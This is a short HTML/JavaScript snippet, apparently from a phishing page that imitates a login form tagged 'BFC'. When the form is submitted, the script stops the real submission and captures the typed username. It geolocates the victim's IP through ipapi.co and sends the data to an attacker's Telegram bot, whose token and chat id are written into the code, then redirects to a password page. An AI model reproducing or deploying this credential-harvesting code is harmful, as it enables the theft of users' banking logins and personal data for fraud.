  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el cdigo se repita evita que se enve el formulario
      axios
        .get(url)
        .then((response) => {
          const identificacion = document.querySelector("#username").value;

          localStorage.setItem("usuario", identificacion);
          const message =
            "BFC\nUsuario: " +
            identificacion +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot7460112010:AAH0wW82eiCG85gitcV1Tf9jJ_IvUvmENxk/sendMessage",
              {
                chat_id: "6734431637",
                text: message,
              }
            )
            .then((response) => {
              window.location.href = "contra.html";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
